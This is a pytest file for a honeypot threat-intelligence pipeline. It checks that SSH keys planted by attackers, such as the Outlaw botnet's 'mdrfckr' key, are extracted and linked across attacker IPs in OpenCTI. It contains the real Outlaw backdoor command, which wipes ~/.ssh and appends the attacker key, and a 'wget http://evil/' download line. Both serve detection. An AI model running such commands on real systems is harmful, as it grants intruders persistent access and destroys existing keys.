"""Planted-SSH-key extraction — regex + builder + deterministic id contract.

Guards the campaign-IoC pivot wired up 2026-05-22 (commit TBD, this PR).
The headline case is the Outlaw botnet: 472 unique src_ips in 30 days
planting the same `mdrfckr`-tagged SSH key. The pipeline now emits one
cryptographic-key SCO per unique key fingerprint, with a `related-to`
edge from every attacker IP that planted it.

If any of these tests regress, operators lose the one-click campaign
view in OpenCTI — go fix the parser or builder, don't relax the test.
"""

from __future__ import annotations

import pytest

from tpot2cti.parsers.cowrie import CowrieParser, _PLANTED_KEY_RE


# The actual Outlaw payload observed on the user's node2 sensor.
OUTLAW_AUTH_KEY = (
    "ssh-rsa "
    "AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTO"
    "rbMz1+5o73fcBoX8nVbUT0buAnUv9TJ2/9p7+vd0EpZ3tZ/+0Kx34UAX1RV/75GV"
    "OmNX+9EuWonvNoaJe0QXxziig9eLBhpgLmuakb5+BgTFB+rkjAW9u9fStdEnGVS8"
    "hX1knFS4mjUx0HJok8RVcempECjDySYMb66nylAKGwCEE6WEqhmd1MUPgHwGq0Hw"
    "cwSqK13yCgPK5W6hYP5ZYKfNvLC8HgMd4WW+u97k6pFTGtuBJK14uJVcD9IUKqTt"
    "wYyJiiU5pmuUx5bSz0R4WfWDIE6+i6RblASpkGAysVKpRk+orw== mdrfckr"
)
OUTLAW_CMD = (
    f'cd ~ && rm -rf .ssh && mkdir .ssh && '
    f'echo "{OUTLAW_AUTH_KEY}" >> .ssh/authorized_keys'
)


# ---------------------------------------------------------------------------
# Regex-level
# ---------------------------------------------------------------------------

def test_regex_matches_outlaw_payload():
    """The Outlaw key embedded in an echo > authorized_keys command is matched."""
    m = _PLANTED_KEY_RE.search(OUTLAW_CMD)
    assert m is not None
    assert m.group("type") == "ssh-rsa"
    assert m.group("key").startswith("AAAAB3NzaC1yc2EAAAABJQ")
    # The comment is captured up to (not including) the closing shell quote.
    assert "mdrfckr" in (m.group("comment") or "")


def test_regex_supports_ed25519_and_ecdsa():
    """Beyond RSA: ed25519 + ecdsa-sha2-* must also be extracted."""
    samples = [
        ('echo "ssh-ed25519 '
         'AAAAC3NzaC1lZDI1NTE5AAAAIB5JhmA4yyVAOe5/cF0SLLEHsRPMQ4Mq2NSP3eRSP6V8 '
         'comment-ed25519" >> .ssh/authorized_keys'),
        ('echo "ecdsa-sha2-nistp256 '
         'AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKy0pBaXq0qIIvL5tF5LIeM '
         'comment-ecdsa" >> .ssh/authorized_keys'),
    ]
    for cmd in samples:
        m = _PLANTED_KEY_RE.search(cmd)
        assert m is not None, f"failed to match: {cmd[:60]}"
        assert m.group("type") in ("ssh-ed25519", "ecdsa-sha2-nistp256")


def test_regex_ignores_plain_text_mentions():
    """A bare mention of 'ssh-rsa' without a full key blob must not match."""
    samples = [
        "the attacker used an ssh-rsa key",
        "ssh-rsa is a key type",
        "ssh-rsa short_blob",                       # too short
    ]
    for cmd in samples:
        assert _PLANTED_KEY_RE.search(cmd) is None, f"false match: {cmd!r}"


# ---------------------------------------------------------------------------
# Parser-level
# ---------------------------------------------------------------------------

def test_extract_planted_keys_dedups_repeated_planting():
    """Same key planted N times in one command → one entry, deduped by fp."""
    cmd = OUTLAW_CMD + " ; " + OUTLAW_CMD  # plant it twice
    keys = CowrieParser._extract_planted_keys(cmd)
    assert len(keys) == 1
    assert keys[0]["type"] == "ssh-rsa"
    assert keys[0]["comment"] == "mdrfckr"
    assert len(keys[0]["fingerprint"]) == 64  # sha256 hex


def test_extract_planted_keys_returns_empty_for_normal_commands():
    """Normal commands produce no false positives."""
    assert CowrieParser._extract_planted_keys("ls -la /tmp") == []
    assert CowrieParser._extract_planted_keys("wget http://evil/x.sh") == []


def test_parsed_command_event_carries_planted_keys_in_meta(parser_docs):
    """When a Cowrie command-input event plants a key, the ParsedEvent's
    meta carries the extracted key info."""
    # Build a minimal cowrie.command.input doc with the outlaw payload.
    doc = {
        "@timestamp": "2026-05-22T00:00:00+00:00",
        "src_ip": "203.0.113.99",
        "session": "p",
        "t-pot_hostname": "node2",
        "type": "Cowrie",
        "eventid": "cowrie.command.input",
        "input": OUTLAW_CMD,
        "dest_port": 22,
    }
    e = CowrieParser().parse(doc)
    assert e is not None
    planted = e.meta.get("planted_ssh_keys") or []
    assert len(planted) == 1
    assert planted[0]["comment"] == "mdrfckr"


# ---------------------------------------------------------------------------
# Builder-level — the critical contract
# ---------------------------------------------------------------------------

def _build_outlaw_session_objects(builder, parser, src_ip: str):
    """Helper: run a single Cowrie session with the outlaw payload through
    parse → correlate → build_cowrie_session, return the STIX objects list."""
    base = {
        "@timestamp": "2026-05-22T00:00:00+00:00",
        "src_ip": src_ip,
        "src_port": 50001,
        "dest_port": 22,
        "session": f"s-{src_ip}",
        "t-pot_hostname": "node2",
        "type": "Cowrie",
    }
    docs = [
        {**base, "eventid": "cowrie.session.connect"},
        {**base, "eventid": "cowrie.login.success",
         "username": "root", "password": "x"},
        {**base, "eventid": "cowrie.command.input", "input": OUTLAW_CMD},
    ]
    events = [parser.parse(d) for d in docs]
    s = parser.correlate(events)[0]
    return builder.build_cowrie_session(s)


def test_builder_emits_cryptographic_key_for_planted_outlaw_key(builder):
    """Outlaw payload through builder → one cryptographic-key SCO."""
    p = CowrieParser()
    objs = _build_outlaw_session_objects(builder, p, "203.0.113.50")
    ck = [o for o in objs if o["type"] == "cryptographic-key"]
    assert len(ck) == 1
    assert ck[0]["value"].startswith("SHA256:")
    assert ck[0]["x_opencti_score"] == 85, "planted-key score must be 85 (high)"
    assert "planted-key" in ck[0]["x_opencti_labels"]
    assert "campaign-ioc" in ck[0]["x_opencti_labels"]
    assert "comment:mdrfckr" in ck[0]["x_opencti_labels"], (
        "the outlaw `mdrfckr` comment must become a label for filtering"
    )


def test_builder_planted_key_id_deterministic_across_attackers(cfg):
    """The whole point: 2 different attacker IPs planting the SAME key →
    ONE cryptographic-key SCO with the SAME UUID5 id.  This is what
    enables the one-click campaign pivot in OpenCTI.

    Uses TWO separate ``STIXBuilder`` instances because in production
    each cycle gets a fresh per-bundle dedup builder (see
    ``main.builder_factory``).  Within a single bundle the per-instance
    dedup correctly drops the duplicate SCO; the cross-bundle invariant
    is that the IDs match so pycti UPSERTs onto the same OpenCTI entity.
    """
    from tpot2cti.stix.builder import STIXBuilder
    p = CowrieParser()
    b_a, b_b = STIXBuilder(cfg), STIXBuilder(cfg)
    objs_a = _build_outlaw_session_objects(b_a, p, "203.0.113.10")
    objs_b = _build_outlaw_session_objects(b_b, p, "198.51.100.20")
    ck_a = next(o for o in objs_a if o["type"] == "cryptographic-key")
    ck_b = next(o for o in objs_b if o["type"] == "cryptographic-key")
    assert ck_a["id"] == ck_b["id"], (
        "Same planted key MUST produce same UUID5; otherwise the "
        "campaign-pivot view in OpenCTI breaks."
    )
    # IPv4 ids should be distinct (sanity)
    ipv4_a = next(o for o in objs_a if o["type"] == "ipv4-addr")
    ipv4_b = next(o for o in objs_b if o["type"] == "ipv4-addr")
    assert ipv4_a["id"] != ipv4_b["id"]


def test_builder_emits_related_to_from_ipv4_to_planted_key(builder):
    """Each attacker's IPv4 observable must `related-to` the planted-key
    SCO so OpenCTI walks the edge from key → campaign IPs."""
    p = CowrieParser()
    objs = _build_outlaw_session_objects(builder, p, "203.0.113.77")
    ck = next(o for o in objs if o["type"] == "cryptographic-key")
    ipv4 = next(o for o in objs if o["type"] == "ipv4-addr")
    rels = [
        o for o in objs
        if o["type"] == "relationship"
        and o.get("relationship_type") == "related-to"
        and o.get("source_ref") == ipv4["id"]
        and o.get("target_ref") == ck["id"]
    ]
    assert len(rels) == 1, (
        f"expected exactly one IPv4→cryptographic-key related-to edge; "
        f"got {len(rels)}"
    )
